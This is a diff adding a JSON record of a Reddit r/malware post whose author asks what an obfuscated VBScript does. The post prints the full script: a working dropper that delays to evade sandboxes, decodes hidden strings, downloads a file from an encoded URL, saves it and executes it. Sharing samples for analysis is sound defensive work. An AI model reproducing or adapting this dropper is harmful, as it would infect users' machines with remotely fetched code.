@@ -1,0 +1,21 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "I found the following VBS script.  Can anyone understand what this does?\n\n    Dim Bk1Xwax8G\n    sub M97LVKtIIK6Q()\n    End Sub\n    sub JINDNynC4hjqxj()\n    Dim O7ObplXQcIChjQh, Npoc6LJHmX, HsPN\n    O7ObplXQcIChjQh = 97322239: Npoc6LJHmX = 0: HsPN = 0\n    For Npoc6LJHmX = 1 To O7ObplXQcIChjQh\n    HsPN = HsPN + 1\n    Next\n    If HsPN = O7ObplXQcIChjQh Then\n    JvmGrQBWwmc (4)\n    HAyLV80Or\n    VV43F\n    Else\n    MsgBox \"7\", 16, \"66\"\n    End If\n    End Sub\n    Sub HAyLV80Or()\n    Dim GBc38fzku2MyKv, MaCatvkT, R3uCMl54xdeu, ShPkEVxLafgsoq\n    GBc38fzku2MyKv = \"%\"\n    Set MaCatvkT = CreateObject(YWR8hI8O4eP(\"003705002A3B4377192432080A\", \"LWdfrCK7YJ\"))\n    M97LVKtIIK6Q\n    YjpK1fbEC = WsCriPt.SCRIpTnaMe\n    YjpK1fbEC = Left(YjpK1fbEC, Len(YjpK1fbEC) - (2 + 4 + 2 - 4))\n    Bk1Xwax8G = MaCatvkT.ExPaNdenVironMENTstRInGS(GBc38fzku2MyKv &amp; YWR8hI8O4eP(\"3627262F2E2318\", \"BWWVKOWym1lpdP0\") &amp; GBc38fzku2MyKv) &amp; \"\\\" &amp; YjpK1fbEC &amp; YWR8hI8O4eP(\"642D0E15\", \"AJHvpz\")\n    Set ShPkEVxLafgsoq = CreateObject(YWR8hI8O4eP(\"2103261A3F43573318441D251C786C013C\", \"UljEhP08\"))\n    ShPkEVxLafgsoq.oPen YWR8hI8O4eP(\"203431\", \"Egqe7sWbC\"), YWR8hI8O4eP(\"251F062042567E31390E571E2C7A5F5C220D56607162094A01\", \"DMkrPxyQCLl2d\"), False\n    ShPkEVxLafgsoq.SEnD()\n    if ShPkEVxLafgsoq.ReaDystate = (2 + 4 + 2 - 4) and ShPkEVxLafgsoq.sTaTuS = (100 + 4 + 100 - 4) then\n    M97LVKtIIK6Q\n    Set R3uCMl54xdeu = CreateObject(YWR8hI8O4eP(\"22341D03186B301F33232C0E\", \"McpRGZEckAF\"))\n    R3uCMl54xdeu.OpEn\n    R3uCMl54xdeu.tYpe = 1\n    R3uCMl54xdeu.wrITe ShPkEVxLafgsoq.ResponseBody\n    R3uCMl54xdeu.savETofILE Bk1Xwax8G, (1 + 5 + 1 - 5)\n    R3uCMl54xdeu.CLosE\n    JvmGrQBWwmc (2)\n    end if\n    End Sub\n    JINDNynC4hjqxj\n    Sub JvmGrQBWwmc(IiXN4hRLLdaxB6)\n    Dim XtHrmXMnuicrQH\n    XtHrmXMnuicrQH = Timer + IiXN4hRLLdaxB6\n    Do While Timer &lt; XtHrmXMnuicrQH\n    Loop\n    End Sub\n    Function YWR8hI8O4eP(Lka2xkY3g6tbi, IFpzkxPhBcOpSEXd)\n    Dim Xy7sUjg1O9Xq8Xh, CEller4i, PdwVZcWZIrevLLh0i\n    For Xy7sUjg1O9Xq8Xh = 1 To (Len(Lka2xkY3g6tbi) / 2)\n    CEller4i = (Chr(38) &amp; Chr(72) &amp; (Mid(Lka2xkY3g6tbi, (Xy7sUjg1O9Xq8Xh + Xy7sUjg1O9Xq8Xh) - 1, 2)))\n    PdwVZcWZIrevLLh0i = (Asc(Mid(IFpzkxPhBcOpSEXd, ((Xy7sUjg1O9Xq8Xh Mod Len(IFpzkxPhBcOpSEXd)) + 1), 1)))\n    YWR8hI8O4eP = YWR8hI8O4eP + chr(CEller4i Xor PdwVZcWZIrevLLh0i)\n    Next\n    End Function\n    Sub VV43F()\n    CreateObject(YWR8hI8O4eP(\"363C012F386C2C19195D2D3A22030B260B\", \"IeTdCTBmii1DYCwb\")).SheLlEXECutE Bk1Xwax8G, \"\", \"\", YWR8hI8O4eP(\"5F080725\", \"H0xbKG73SVo\"), 1\n    End sub\n    ",
+        "title": "Obfuscated Malware detected. Can anyone understand what it does?",
+        "score": 13,
+        "id": "3vx5dp",
+        "commsNum": 20,
+        "timeStamp": "2015/12/08-04:06:24",
+        "author_name": "huihuichangbot",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 20,
+        "over_18": false,
+        "spoiler": null,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/3vx5dp/obfuscated_malware_detected_can_anyone_understand/"
+    },
+    "posts": {}
+}
